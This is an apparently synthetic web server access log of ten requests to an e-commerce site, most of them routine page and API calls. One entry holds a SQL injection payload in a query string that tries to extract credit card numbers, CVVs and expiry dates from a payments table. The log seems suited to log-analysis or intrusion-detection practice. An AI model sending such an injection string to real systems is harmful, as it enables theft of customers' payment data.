192.168.1.26 - - [15/Jun/2025:00:45:37 +0000] "GET /static/js/app.js HTTP/1.1" 200 5392 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:38:25 +0000] "GET /api/user/profile HTTP/1.1" 200 1711 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.30 - - [15/Jun/2025:00:34:58 +0000] "GET /favicon.ico HTTP/1.1" 404 5210 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:15:41 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.37 - - [15/Jun/2025:00:26:37 +0000] "GET /contact HTTP/1.1" 404 937 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.36 - - [15/Jun/2025:00:49:24 +0000] "GET /contact HTTP/1.1" 304 3063 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.18 - - [15/Jun/2025:00:35:38 +0000] "GET /api/products?category=clothing HTTP/1.1" 404 694 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:30:49 +0000] "GET /api/user/profile HTTP/1.1" 200 3947 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:20:32 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 523 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.37 - - [15/Jun/2025:00:53:41 +0000] "POST /contact HTTP/1.1" 201 7393 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
